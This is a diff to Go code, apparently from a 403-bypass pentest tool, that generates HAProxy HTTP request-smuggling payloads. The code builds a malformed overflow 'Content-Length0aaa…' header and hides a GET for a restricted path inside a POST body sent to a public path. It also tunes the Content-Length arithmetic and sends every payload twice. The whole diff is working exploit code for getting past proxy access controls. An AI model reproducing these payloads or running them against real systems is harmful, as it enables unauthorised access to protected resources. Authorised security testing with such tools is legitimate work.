@@ -47,27 +47,30 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 
 	// Generate overflow pattern - exact pattern from working PoC
 	// Content-Length0 + 256 'a' characters
-	overflowPattern := "0" + strings.Repeat("a", 256)
+	overflowPattern := "0" + strings.Repeat("a", 255)
 	malformedHeaderName := "Content-Length" + overflowPattern
 
 	// For each public path, try to smuggle a request to the target path
 	for _, publicPath := range publicPaths {
-		// Craft the smuggled request - avoid \r\n\r\n in body as fasthttp interprets it as end of request
+		// Craft the smuggled request - this goes in the body and targets the RESTRICTED path
+		// The h:GET header references the PUBLIC path for camouflage
 		smuggledRequest := fmt.Sprintf("GET %s HTTP/1.1\r\nh:GET %s HTTP/1.1\r\nHost: %s\r\n\r\n",
-			path,       // Target/restricted path
-			publicPath, // Public path for header value camouflage
+			path,       // Target/RESTRICTED path (what we want to access)
+			publicPath, // PUBLIC path (for h:GET camouflage header)
 			host)
 
-		// Use a body that doesn't contain \r\n\r\n to avoid fasthttp parsing issues
-		//smuggledRequest := fmt.Sprintf("x=123&smuggle=1\r\n\r\n")
-		// Calculate the content length for the smuggled request
-		calculatedContentLength := len(smuggledRequest)
+		// Calculate content length WITHOUT \r\n sequences for HTTP smuggling compatibility
+		// Some proxies/servers don't count line endings in Content-Length processing
+		//requestWithoutCRLF := strings.ReplaceAll(smuggledRequest, "\r\n", "")
+		//calculatedContentLength := len(requestWithoutCRLF)
+		calculatedContentLength := len(smuggledRequest) - strings.Count(smuggledRequest, "\r") - strings.Count(smuggledRequest, "\n")
 
 		GB403Logger.Debug().Msgf("== HAProxy Smuggled Request ==")
-		GB403Logger.Debug().Msgf("Target path: %s", path)
-		GB403Logger.Debug().Msgf("Public path: %s", publicPath)
+		GB403Logger.Debug().Msgf("Restricted target path: %s", path)
+		GB403Logger.Debug().Msgf("Public path (for POST + h:GET): %s", publicPath)
 		GB403Logger.Debug().Msgf("Host: %s", host)
-		GB403Logger.Debug().Msgf("Smuggled request body (%d bytes): %q", calculatedContentLength, smuggledRequest)
+		GB403Logger.Debug().Msgf("Smuggled request body (%d bytes total): %q", len(smuggledRequest), smuggledRequest)
+		GB403Logger.Debug().Msgf("Content-Length calculation (without \\r\\n): %d bytes", calculatedContentLength)
 
 		// Create payload matching the working PoC structure
 		job := BypassPayload{
@@ -75,23 +78,15 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 			Method:       "POST",
 			Scheme:       parsedURL.Scheme,
 			Host:         host,
-			RawURI:       publicPath,
+			RawURI:       publicPath, // POST goes to PUBLIC path
 			BypassModule: bypassModule,
-			Body:         smuggledRequest,
+			Body:         smuggledRequest, // BODY contains request to RESTRICTED path
 			Headers: []Headers{
 				// 1. Malformed header FIRST - NO VALUE after colon (like working PoC)
 				{
 					Header: malformedHeaderName, // e.g., "Content-Length0aaa..." (no colon, request.go adds it)
-					Value:  "0",                 // EMPTY VALUE - this is critical!
+					Value:  "",                  // EMPTY VALUE - this is critical!
 				},
-				// {
-				// 	Header: "Content-Type: application/x-www-form-urlencoded",
-				// 	Value:  "application/x-www-form-urlencoded",
-				// },
-				// {
-				// 	Header: "Content-Type",
-				// 	Value:  "application/x-www-form-urlencoded",
-				// },
 				// 2. Real Content-Length will be deferred to LAST position in request.go
 				{
 					Header: "Content-Length",
@@ -102,11 +97,16 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 
 		job.PayloadToken = GeneratePayloadToken(job)
 
-		// Add the job twice - request smuggling often needs multiple attempts
-		allJobs = append(allJobs, job)
+		// Add the job to our list
 		allJobs = append(allJobs, job)
 	}
 
-	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payload(s) (doubled) for %s", len(allJobs), targetURL)
-	return allJobs
+	// HTTP Request Smuggling often requires sending the request TWICE
+	// Double the entire payload list (not just duplicate individual jobs)
+	doubledJobs := make([]BypassPayload, len(allJobs)*2)
+	copy(doubledJobs, allJobs)
+	copy(doubledJobs[len(allJobs):], allJobs)
+
+	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payload(s) (%d variations x2 for smuggling) for %s", len(doubledJobs), len(publicPaths), targetURL)
+	return doubledJobs
 }
